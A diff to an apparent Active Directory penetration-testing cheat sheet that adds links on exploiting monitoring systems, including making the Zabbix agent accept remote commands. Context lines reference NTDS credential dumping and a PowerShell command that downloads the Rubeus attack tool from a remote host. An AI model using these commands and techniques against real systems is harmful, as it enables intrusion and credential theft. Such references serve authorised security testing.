@@ -389,6 +389,12 @@ powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.e
 **[ntdsutil](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#a-d-maintenance-ntdsutil)**
 **[VSSAdmin](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#volume-shadow-copy-vssadmin)**
 
+## Exploitation of Monitoring Systems
+**[Exploitation of Monitoring Systems](https://github.com/HD421/Monitoring-Systems-Cheat-Sheet)**
+
+  - [Zabbix Agent](https://medium.com/@ferspider3/enabling-zabbix-agent-windows-to-accept-remote-commands-2597c40259b6)
+    - Scripts in Zabbix can be used to perform custom monitoring checks, collect and process data from external sources, and automate tasks based on monitoring events. 
+
 -----------------------------------------------------------------------
 
 # Active Directory Tools
